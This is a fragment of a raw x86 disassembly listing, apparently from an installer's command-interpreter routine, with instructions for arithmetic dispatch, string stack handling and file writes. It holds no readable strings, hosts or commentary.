  4016ce:	e9 4a 0c 00 00       	jmp    0x40231d
  4016d3:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016d6:	0f 84 7e 12 00 00    	je     0x40295a
  4016dc:	56                   	push   %esi
  4016dd:	e8 57 53 00 00       	call   0x406a39
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 84 70 12 00 00    	je     0x40295a
  4016ea:	57                   	push   %edi
  4016eb:	56                   	push   %esi
  4016ec:	e8 ab 4d 00 00       	call   0x40649c
  4016f1:	6a e4                	push   $0xffffffe4
  4016f3:	e9 25 0c 00 00       	jmp    0x40231d
  4016f8:	53                   	push   %ebx
  4016f9:	e8 d4 16 00 00       	call   0x402dd2
  4016fe:	8b 7d f4             	mov    -0xc(%ebp),%edi
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 e8 80 40 00    	call   *0x4080e8
  401714:	85 c0                	test   %eax,%eax
  401716:	74 24                	je     0x40173c
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 27                	jbe    0x401746
  40171f:	66 39 18             	cmp    %bx,(%eax)
  401722:	74 22                	je     0x401746
  401724:	56                   	push   %esi
  401725:	e8 0f 53 00 00       	call   0x406a39
  40172a:	3b c3                	cmp    %ebx,%eax
  40172c:	74 0e                	je     0x40173c
  40172e:	83 c0 2c             	add    $0x2c,%eax
  401731:	50                   	push   %eax
  401732:	ff 75 08             	push   0x8(%ebp)
  401735:	e8 a2 4f 00 00       	call   0x4066dc
  40173a:	eb 0a                	jmp    0x401746
  40173c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401743:	66 89 1f             	mov    %bx,(%edi)
  401746:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401749:	0f 85 07 15 00 00    	jne    0x402c56
  40174f:	68 00 04 00 00       	push   $0x400
  401754:	57                   	push   %edi
  401755:	57                   	push   %edi
  401756:	ff 15 ec 80 40 00    	call   *0x4080ec
  40175c:	e9 f5 14 00 00       	jmp    0x402c56
  401761:	6a ff                	push   $0xffffffff
  401763:	e8 6a 16 00 00       	call   0x402dd2
  401768:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	57                   	push   %edi
  40176d:	68 00 04 00 00       	push   $0x400
  401772:	53                   	push   %ebx
  401773:	50                   	push   %eax
  401774:	53                   	push   %ebx
  401775:	ff 15 f0 80 40 00    	call   *0x4080f0
  40177b:	85 c0                	test   %eax,%eax
  40177d:	0f 85 d3 14 00 00    	jne    0x402c56
  401783:	e9 a0 11 00 00       	jmp    0x402928
  401788:	6a ef                	push   $0xffffffef
  40178a:	e8 43 16 00 00       	call   0x402dd2
  40178f:	50                   	push   %eax
  401790:	57                   	push   %edi
  401791:	e8 65 4a 00 00       	call   0x4061fb
  401796:	e9 3e fe ff ff       	jmp    0x4015d9
  40179b:	6a 31                	push   $0x31
  40179d:	e8 30 16 00 00       	call   0x402dd2
  4017a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4017a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4017a8:	ff 75 f8             	push   -0x8(%ebp)
  4017ab:	83 e0 07             	and    $0x7,%eax
  4017ae:	89 45 08             	mov    %eax,0x8(%ebp)
  4017b1:	e8 6c 48 00 00       	call   0x406022
  4017b6:	ff 75 f8             	push   -0x8(%ebp)
  4017b9:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	74 08                	je     0x4017ca
  4017c2:	57                   	push   %edi
  4017c3:	e8 14 4f 00 00       	call   0x4066dc
  4017c8:	eb 17                	jmp    0x4017e1
  4017ca:	68 00 50 43 00       	push   $0x435000
  4017cf:	57                   	push   %edi
  4017d0:	e8 07 4f 00 00       	call   0x4066dc
  4017d5:	50                   	push   %eax
  4017d6:	e8 d0 47 00 00       	call   0x405fab
  4017db:	50                   	push   %eax
  4017dc:	e8 17 4f 00 00       	call   0x4066f8
  4017e1:	57                   	push   %edi
  4017e2:	e8 a3 51 00 00       	call   0x40698a
  4017e7:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017eb:	7c 31                	jl     0x40181e
  4017ed:	57                   	push   %edi
  4017ee:	e8 46 52 00 00       	call   0x406a39
  4017f3:	33 c9                	xor    %ecx,%ecx
  4017f5:	3b c3                	cmp    %ebx,%eax
  4017f7:	74 10                	je     0x401809
  4017f9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017fc:	83 c0 14             	add    $0x14,%eax
  4017ff:	51                   	push   %ecx
  401800:	50                   	push   %eax
  401801:	ff 15 f4 80 40 00    	call   *0x4080f4
  401807:	8b c8                	mov    %eax,%ecx
  401809:	8b 45 08             	mov    0x8(%ebp),%eax
  40180c:	83 c0 fd             	add    $0xfffffffd,%eax
  40180f:	0d 00 00 00 80       	or     $0x80000000,%eax
  401814:	23 c1                	and    %ecx,%eax
  401816:	f7 d8                	neg    %eax
  401818:	1b c0                	sbb    %eax,%eax
  40181a:	40                   	inc    %eax
  40181b:	89 45 08             	mov    %eax,0x8(%ebp)
  40181e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401821:	75 06                	jne    0x401829
  401823:	57                   	push   %edi
  401824:	e8 7e 49 00 00       	call   0x4061a7
  401829:	33 c0                	xor    %eax,%eax
  40182b:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40182f:	0f 95 c0             	setne  %al
  401832:	40                   	inc    %eax
  401833:	50                   	push   %eax
  401834:	68 00 00 00 40       	push   $0x40000000
  401839:	57                   	push   %edi
  40183a:	e8 8d 49 00 00       	call   0x4061cc
  40183f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401842:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401845:	75 72                	jne    0x4018b9
  401847:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184a:	75 4f                	jne    0x40189b
  40184c:	56                   	push   %esi
  40184d:	68 f8 b5 40 00       	push   $0x40b5f8
  401852:	e8 85 4e 00 00       	call   0x4066dc
  401857:	57                   	push   %edi
  401858:	56                   	push   %esi
  401859:	e8 7e 4e 00 00       	call   0x4066dc
  40185e:	ff 75 e4             	push   -0x1c(%ebp)
  401861:	68 f8 ad 40 00       	push   $0x40adf8
  401866:	e8 ae 4e 00 00       	call   0x406719
  40186b:	68 f8 b5 40 00       	push   $0x40b5f8
  401870:	56                   	push   %esi
  401871:	e8 66 4e 00 00       	call   0x4066dc
  401876:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401879:	c1 f8 03             	sar    $0x3,%eax
  40187c:	50                   	push   %eax
  40187d:	68 f8 ad 40 00       	push   $0x40adf8
  401882:	e8 b5 44 00 00       	call   0x405d3c
  401887:	83 e8 04             	sub    $0x4,%eax
  40188a:	0f 84 57 ff ff ff    	je     0x4017e7
  401890:	48                   	dec    %eax
  401891:	74 1b                	je     0x4018ae
  401893:	57                   	push   %edi
  401894:	6a fa                	push   $0xfffffffa
  401896:	e9 f8 fb ff ff       	jmp    0x401493
  40189b:	ff 75 f8             	push   -0x8(%ebp)
  40189e:	6a e2                	push   $0xffffffe2
  4018a0:	e8 bc 3e 00 00       	call   0x405761
  4018a5:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018a9:	e9 2d fd ff ff       	jmp    0x4015db
  4018ae:	ff 05 e8 9a 42 00    	incl   0x429ae8
  4018b4:	e9 a6 13 00 00       	jmp    0x402c5f
  4018b9:	ff 75 f8             	push   -0x8(%ebp)
  4018bc:	6a ea                	push   $0xffffffea
  4018be:	e8 9e 3e 00 00       	call   0x405761
  4018c3:	ff 05 14 9b 42 00    	incl   0x429b14
  4018c9:	53                   	push   %ebx
  4018ca:	53                   	push   %ebx
  4018cb:	ff 75 c8             	push   -0x38(%ebp)
  4018ce:	ff 75 d8             	push   -0x28(%ebp)
  4018d1:	e8 fa 1a 00 00       	call   0x4033d0
  4018d6:	ff 0d 14 9b 42 00    	decl   0x429b14
  4018dc:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	75 06                	jne    0x4018ea
  4018e4:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018e8:	74 12                	je     0x4018fc
  4018ea:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ed:	50                   	push   %eax
  4018ee:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018f1:	53                   	push   %ebx
  4018f2:	50                   	push   %eax
  4018f3:	ff 75 c8             	push   -0x38(%ebp)
  4018f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018fc:	ff 75 c8             	push   -0x38(%ebp)
  4018ff:	ff 15 fc 80 40 00    	call   *0x4080fc
  401905:	3b f3                	cmp    %ebx,%esi
  401907:	0f 8d 49 13 00 00    	jge    0x402c56
  40190d:	83 fe fe             	cmp    $0xfffffffe,%esi
  401910:	75 13                	jne    0x401925
  401912:	6a e9                	push   $0xffffffe9
  401914:	57                   	push   %edi
  401915:	e8 ff 4d 00 00       	call   0x406719
  40191a:	ff 75 f8             	push   -0x8(%ebp)
  40191d:	57                   	push   %edi
  40191e:	e8 d5 4d 00 00       	call   0x4066f8
  401923:	eb 08                	jmp    0x40192d
  401925:	6a ee                	push   $0xffffffee
  401927:	57                   	push   %edi
  401928:	e8 ec 4d 00 00       	call   0x406719
  40192d:	68 10 00 20 00       	push   $0x200010
  401932:	57                   	push   %edi
  401933:	e9 8c 0a 00 00       	jmp    0x4023c4
  401938:	53                   	push   %ebx
  401939:	eb 34                	jmp    0x40196f
  40193b:	6a 31                	push   $0x31
  40193d:	e8 90 14 00 00       	call   0x402dd2
  401942:	ff 75 d0             	push   -0x30(%ebp)
  401945:	50                   	push   %eax
  401946:	e8 f1 43 00 00       	call   0x405d3c
  40194b:	3b c3                	cmp    %ebx,%eax
  40194d:	0f 84 07 10 00 00    	je     0x40295a
  401953:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401956:	0f 84 6c 01 00 00    	je     0x401ac8
  40195c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40195f:	0f 85 f1 12 00 00    	jne    0x402c56
  401965:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401968:	e9 f4 12 00 00       	jmp    0x402c61
  40196d:	6a f0                	push   $0xfffffff0
  40196f:	e8 5e 14 00 00       	call   0x402dd2
  401974:	ff 75 d4             	push   -0x2c(%ebp)
  401977:	50                   	push   %eax
  401978:	e8 6b 44 00 00       	call   0x405de8
  40197d:	e9 d4 12 00 00       	jmp    0x402c56
  401982:	6a 01                	push   $0x1
  401984:	e8 49 14 00 00       	call   0x402dd2
  401989:	50                   	push   %eax
  40198a:	e8 63 4d 00 00       	call   0x4066f2
  40198f:	e9 d0 0c 00 00       	jmp    0x402664
  401994:	6a 02                	push   $0x2
  401996:	e8 15 14 00 00       	call   0x402db0
  40199b:	6a 03                	push   $0x3
  40199d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4019a0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019a3:	e8 08 14 00 00       	call   0x402db0
  4019a8:	59                   	pop    %ecx
  4019a9:	8b f0                	mov    %eax,%esi
  4019ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ae:	59                   	pop    %ecx
  4019af:	6a 01                	push   $0x1
  4019b1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4019b4:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4019b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ba:	e8 13 14 00 00       	call   0x402dd2
  4019bf:	50                   	push   %eax
  4019c0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4019c3:	e8 2a 4d 00 00       	call   0x4066f2
  4019c8:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019cb:	66 89 1f             	mov    %bx,(%edi)
  4019ce:	75 03                	jne    0x4019d3
  4019d0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019d3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d6:	0f 84 7a 12 00 00    	je     0x402c56
  4019dc:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019df:	3b cb                	cmp    %ebx,%ecx
  4019e1:	7d 0b                	jge    0x4019ee
  4019e3:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019e6:	3b f3                	cmp    %ebx,%esi
  4019e8:	0f 8c 68 12 00 00    	jl     0x402c56
  4019ee:	3b f0                	cmp    %eax,%esi
  4019f0:	7e 02                	jle    0x4019f4
  4019f2:	8b f0                	mov    %eax,%esi
  4019f4:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019f7:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019fa:	50                   	push   %eax
  4019fb:	57                   	push   %edi
  4019fc:	e8 db 4c 00 00       	call   0x4066dc
  401a01:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401a04:	7d 0e                	jge    0x401a14
  401a06:	57                   	push   %edi
  401a07:	e8 e6 4c 00 00       	call   0x4066f2
  401a0c:	01 45 08             	add    %eax,0x8(%ebp)
  401a0f:	79 03                	jns    0x401a14
  401a11:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a14:	8b 45 08             	mov    0x8(%ebp),%eax
  401a17:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a1c:	0f 8d 34 12 00 00    	jge    0x402c56
  401a22:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  401a26:	e9 2b 12 00 00       	jmp    0x402c56
  401a2b:	6a 20                	push   $0x20
  401a2d:	e8 a0 13 00 00       	call   0x402dd2
  401a32:	6a 31                	push   $0x31
  401a34:	8b f0                	mov    %eax,%esi
  401a36:	e8 97 13 00 00       	call   0x402dd2
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	50                   	push   %eax
  401a3f:	56                   	push   %esi
  401a40:	75 12                	jne    0x401a54
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	85 c0                	test   %eax,%eax
  401a4a:	75 7c                	jne    0x401ac8
  401a4c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a4f:	e9 0d 12 00 00       	jmp    0x402c61
  401a54:	ff 15 04 81 40 00    	call   *0x408104
  401a5a:	eb ec                	jmp    0x401a48
  401a5c:	33 f6                	xor    %esi,%esi
  401a5e:	46                   	inc    %esi
  401a5f:	56                   	push   %esi
  401a60:	e8 6d 13 00 00       	call   0x402dd2
  401a65:	68 00 04 00 00       	push   $0x400
  401a6a:	57                   	push   %edi
  401a6b:	50                   	push   %eax
  401a6c:	89 45 08             	mov    %eax,0x8(%ebp)
  401a6f:	ff 15 08 81 40 00    	call   *0x408108
  401a75:	85 c0                	test   %eax,%eax
  401a77:	74 13                	je     0x401a8c
  401a79:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a7c:	74 14                	je     0x401a92
  401a7e:	57                   	push   %edi
  401a7f:	ff 75 08             	push   0x8(%ebp)
  401a82:	ff 15 04 81 40 00    	call   *0x408104
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	75 06                	jne    0x401a92
  401a8c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a8f:	66 89 1f             	mov    %bx,(%edi)
  401a92:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a99:	e9 b8 11 00 00       	jmp    0x402c56
  401a9e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401aa1:	53                   	push   %ebx
  401aa2:	e8 09 13 00 00       	call   0x402db0
  401aa7:	6a 01                	push   $0x1
  401aa9:	8b f8                	mov    %eax,%edi
  401aab:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aae:	e8 fd 12 00 00       	call   0x402db0
  401ab3:	59                   	pop    %ecx
  401ab4:	3b f3                	cmp    %ebx,%esi
  401ab6:	59                   	pop    %ecx
  401ab7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aba:	75 08                	jne    0x401ac4
  401abc:	3b f8                	cmp    %eax,%edi
  401abe:	7c 08                	jl     0x401ac8
  401ac0:	7e 8a                	jle    0x401a4c
  401ac2:	eb 12                	jmp    0x401ad6
  401ac4:	3b f8                	cmp    %eax,%edi
  401ac6:	73 08                	jae    0x401ad0
  401ac8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401acb:	e9 91 11 00 00       	jmp    0x402c61
  401ad0:	0f 86 76 ff ff ff    	jbe    0x401a4c
  401ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ad9:	e9 83 11 00 00       	jmp    0x402c61
  401ade:	6a 01                	push   $0x1
  401ae0:	e8 cb 12 00 00       	call   0x402db0
  401ae5:	8b f0                	mov    %eax,%esi
  401ae7:	6a 02                	push   $0x2
  401ae9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aec:	89 75 08             	mov    %esi,0x8(%ebp)
  401aef:	e8 bc 12 00 00       	call   0x402db0
  401af4:	59                   	pop    %ecx
  401af5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401af8:	59                   	pop    %ecx
  401af9:	8b c8                	mov    %eax,%ecx
  401afb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401afe:	83 f8 0d             	cmp    $0xd,%eax
  401b01:	0f 87 94 00 00 00    	ja     0x401b9b
  401b07:	ff 24 85 78 2d 40 00 	jmp    *0x402d78(,%eax,4)
  401b0e:	03 f1                	add    %ecx,%esi
  401b10:	e9 5f 03 00 00       	jmp    0x401e74
  401b15:	2b f1                	sub    %ecx,%esi
  401b17:	e9 58 03 00 00       	jmp    0x401e74
  401b1c:	0f af ce             	imul   %esi,%ecx
  401b1f:	eb 1a                	jmp    0x401b3b
  401b21:	3b cb                	cmp    %ebx,%ecx
  401b23:	74 53                	je     0x401b78
  401b25:	8b c6                	mov    %esi,%eax
  401b27:	99                   	cltd
  401b28:	f7 f9                	idiv   %ecx
  401b2a:	8b f0                	mov    %eax,%esi
  401b2c:	e9 43 03 00 00       	jmp    0x401e74
  401b31:	0b ce                	or     %esi,%ecx
  401b33:	eb 06                	jmp    0x401b3b
  401b35:	23 ce                	and    %esi,%ecx
  401b37:	eb 02                	jmp    0x401b3b
  401b39:	33 ce                	xor    %esi,%ecx
  401b3b:	8b f1                	mov    %ecx,%esi
  401b3d:	e9 32 03 00 00       	jmp    0x401e74
  401b42:	33 c0                	xor    %eax,%eax
  401b44:	3b f3                	cmp    %ebx,%esi
  401b46:	0f 94 c0             	sete   %al
  401b49:	eb df                	jmp    0x401b2a
  401b4b:	3b f3                	cmp    %ebx,%esi
  401b4d:	75 11                	jne    0x401b60
  401b4f:	eb 0b                	jmp    0x401b5c
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	e9 1c 03 00 00       	jmp    0x401e74
  401b58:	3b f3                	cmp    %ebx,%esi
  401b5a:	74 f5                	je     0x401b51
  401b5c:	3b cb                	cmp    %ebx,%ecx
  401b5e:	74 f1                	je     0x401b51
  401b60:	33 f6                	xor    %esi,%esi
  401b62:	46                   	inc    %esi
  401b63:	e9 0c 03 00 00       	jmp    0x401e74
  401b68:	3b cb                	cmp    %ebx,%ecx
  401b6a:	74 0c                	je     0x401b78
  401b6c:	8b c6                	mov    %esi,%eax
  401b6e:	99                   	cltd
  401b6f:	f7 f9                	idiv   %ecx
  401b71:	8b f2                	mov    %edx,%esi
  401b73:	e9 fc 02 00 00       	jmp    0x401e74
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b81:	e9 ee 02 00 00       	jmp    0x401e74
  401b86:	d3 e6                	shl    %cl,%esi
  401b88:	e9 e7 02 00 00       	jmp    0x401e74
  401b8d:	d3 fe                	sar    %cl,%esi
  401b8f:	e9 e0 02 00 00       	jmp    0x401e74
  401b94:	d3 ee                	shr    %cl,%esi
  401b96:	e9 d9 02 00 00       	jmp    0x401e74
  401b9b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b9e:	e9 d1 02 00 00       	jmp    0x401e74
  401ba3:	6a 01                	push   $0x1
  401ba5:	e8 28 12 00 00       	call   0x402dd2
  401baa:	6a 02                	push   $0x2
  401bac:	8b f0                	mov    %eax,%esi
  401bae:	e8 fd 11 00 00       	call   0x402db0
  401bb3:	50                   	push   %eax
  401bb4:	56                   	push   %esi
  401bb5:	57                   	push   %edi
  401bb6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401bb9:	ff 15 2c 82 40 00    	call   *0x40822c
  401bbf:	83 c4 10             	add    $0x10,%esp
  401bc2:	e9 8f 10 00 00       	jmp    0x402c56
  401bc7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401bca:	8b 35 58 ce 40 00    	mov    0x40ce58,%esi
  401bd0:	3b c3                	cmp    %ebx,%eax
  401bd2:	74 44                	je     0x401c18
  401bd4:	48                   	dec    %eax
  401bd5:	3b f3                	cmp    %ebx,%esi
  401bd7:	0f 84 d9 07 00 00    	je     0x4023b6
  401bdd:	8b 36                	mov    (%esi),%esi
  401bdf:	3b c3                	cmp    %ebx,%eax
  401be1:	75 f1                	jne    0x401bd4
  401be3:	3b f3                	cmp    %ebx,%esi
  401be5:	0f 84 cb 07 00 00    	je     0x4023b6
  401beb:	83 c6 04             	add    $0x4,%esi
  401bee:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  401bf3:	56                   	push   %esi
  401bf4:	57                   	push   %edi
  401bf5:	e8 e2 4a 00 00       	call   0x4066dc
  401bfa:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401bff:	83 c0 04             	add    $0x4,%eax
  401c02:	50                   	push   %eax
  401c03:	56                   	push   %esi
  401c04:	e8 d3 4a 00 00       	call   0x4066dc
  401c09:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401c0e:	57                   	push   %edi
  401c0f:	83 c0 04             	add    $0x4,%eax
  401c12:	50                   	push   %eax
  401c13:	e9 a8 0e 00 00       	jmp    0x402ac0
  401c18:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c1b:	74 25                	je     0x401c42
  401c1d:	3b f3                	cmp    %ebx,%esi
  401c1f:	0f 84 35 0d 00 00    	je     0x40295a
  401c25:	8d 46 04             	lea    0x4(%esi),%eax
  401c28:	50                   	push   %eax
  401c29:	57                   	push   %edi
  401c2a:	e8 ad 4a 00 00       	call   0x4066dc
  401c2f:	8b 06                	mov    (%esi),%eax
  401c31:	56                   	push   %esi
  401c32:	a3 58 ce 40 00       	mov    %eax,0x40ce58
  401c37:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3d:	e9 14 10 00 00       	jmp    0x402c56
  401c42:	68 04 08 00 00       	push   $0x804
  401c47:	6a 40                	push   $0x40
  401c49:	ff 15 10 81 40 00    	call   *0x408110
  401c4f:	ff 75 d0             	push   -0x30(%ebp)
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	8d 46 04             	lea    0x4(%esi),%eax
  401c57:	50                   	push   %eax
  401c58:	e8 bc 4a 00 00       	call   0x406719
  401c5d:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401c62:	89 06                	mov    %eax,(%esi)
  401c64:	89 35 58 ce 40 00    	mov    %esi,0x40ce58
  401c6a:	e9 e7 0f 00 00       	jmp    0x402c56
  401c6f:	6a 03                	push   $0x3
  401c71:	e8 3a 11 00 00       	call   0x402db0
  401c76:	6a 04                	push   $0x4
  401c78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c7b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c7e:	e8 2d 11 00 00       	call   0x402db0
  401c83:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c8b:	59                   	pop    %ecx
  401c8c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c8f:	74 0a                	je     0x401c9b
  401c91:	6a 33                	push   $0x33
  401c93:	e8 3a 11 00 00       	call   0x402dd2
  401c98:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c9b:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c9f:	74 0a                	je     0x401cab
  401ca1:	6a 44                	push   $0x44
  401ca3:	e8 2a 11 00 00       	call   0x402dd2
  401ca8:	89 45 08             	mov    %eax,0x8(%ebp)
  401cab:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401caf:	6a 01                	push   $0x1
  401cb1:	75 4c                	jne    0x401cff
  401cb3:	e8 f8 10 00 00       	call   0x402db0
  401cb8:	6a 02                	push   $0x2
  401cba:	8b f0                	mov    %eax,%esi
  401cbc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cbf:	e8 ec 10 00 00       	call   0x402db0
  401cc4:	59                   	pop    %ecx
  401cc5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cc8:	59                   	pop    %ecx
  401cc9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ccc:	c1 f9 02             	sar    $0x2,%ecx
  401ccf:	74 1e                	je     0x401cef
  401cd1:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cd4:	52                   	push   %edx
  401cd5:	51                   	push   %ecx
  401cd6:	53                   	push   %ebx
  401cd7:	ff 75 08             	push   0x8(%ebp)
  401cda:	ff 75 e8             	push   -0x18(%ebp)
  401cdd:	50                   	push   %eax
  401cde:	56                   	push   %esi
  401cdf:	ff 15 30 82 40 00    	call   *0x408230
  401ce5:	f7 d8                	neg    %eax
  401ce7:	1b c0                	sbb    %eax,%eax
  401ce9:	40                   	inc    %eax
  401cea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ced:	eb 43                	jmp    0x401d32
  401cef:	ff 75 08             	push   0x8(%ebp)
  401cf2:	ff 75 e8             	push   -0x18(%ebp)
  401cf5:	50                   	push   %eax
  401cf6:	56                   	push   %esi
  401cf7:	ff 15 58 82 40 00    	call   *0x408258
  401cfd:	eb 30                	jmp    0x401d2f
  401cff:	e8 ce 10 00 00       	call   0x402dd2
  401d04:	6a 12                	push   $0x12
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	e8 c5 10 00 00       	call   0x402dd2
  401d0d:	66 8b 08             	mov    (%eax),%cx
  401d10:	66 f7 d9             	neg    %cx
  401d13:	1b c9                	sbb    %ecx,%ecx
  401d15:	23 c8                	and    %eax,%ecx
  401d17:	66 8b 06             	mov    (%esi),%ax
  401d1a:	66 f7 d8             	neg    %ax
  401d1d:	1b c0                	sbb    %eax,%eax
  401d1f:	51                   	push   %ecx
  401d20:	23 c6                	and    %esi,%eax
  401d22:	50                   	push   %eax
  401d23:	ff 75 08             	push   0x8(%ebp)
  401d26:	ff 75 e8             	push   -0x18(%ebp)
  401d29:	ff 15 34 82 40 00    	call   *0x408234
  401d2f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d32:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d35:	0f 8c 1b 0f 00 00    	jl     0x402c56
  401d3b:	ff 75 c8             	push   -0x38(%ebp)
  401d3e:	e9 4f f8 ff ff       	jmp    0x401592
  401d43:	53                   	push   %ebx
  401d44:	e8 67 10 00 00       	call   0x402db0
  401d49:	59                   	pop    %ecx
  401d4a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4d:	50                   	push   %eax
  401d4e:	ff 15 38 82 40 00    	call   *0x408238
  401d54:	85 c0                	test   %eax,%eax
  401d56:	0f 84 f0 fc ff ff    	je     0x401a4c
  401d5c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d5f:	e9 fd 0e 00 00       	jmp    0x402c61
  401d64:	6a 02                	push   $0x2
  401d66:	e8 45 10 00 00       	call   0x402db0
  401d6b:	6a 01                	push   $0x1
  401d6d:	8b f0                	mov    %eax,%esi
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	e8 39 10 00 00       	call   0x402db0
  401d77:	59                   	pop    %ecx
  401d78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d7b:	59                   	pop    %ecx
  401d7c:	56                   	push   %esi
  401d7d:	50                   	push   %eax
  401d7e:	ff 15 3c 82 40 00    	call   *0x40823c
  401d84:	e9 db 08 00 00       	jmp    0x402664
  401d89:	a1 a8 9a 42 00       	mov    0x429aa8,%eax
  401d8e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d91:	53                   	push   %ebx
  401d92:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d95:	e8 16 10 00 00       	call   0x402db0
  401d9a:	59                   	pop    %ecx
  401d9b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d9e:	56                   	push   %esi
  401d9f:	6a eb                	push   $0xffffffeb
  401da1:	50                   	push   %eax
  401da2:	ff 15 40 82 40 00    	call   *0x408240
  401da8:	e9 a9 0e 00 00       	jmp    0x402c56
  401dad:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401db1:	74 0d                	je     0x401dc0
  401db3:	6a 02                	push   $0x2
  401db5:	e8 f6 0f 00 00       	call   0x402db0
  401dba:	59                   	pop    %ecx
  401dbb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401dbe:	eb 0c                	jmp    0x401dcc
  401dc0:	ff 75 d8             	push   -0x28(%ebp)
  401dc3:	ff 75 f8             	push   -0x8(%ebp)
  401dc6:	ff 15 3c 82 40 00    	call   *0x40823c
  401dcc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
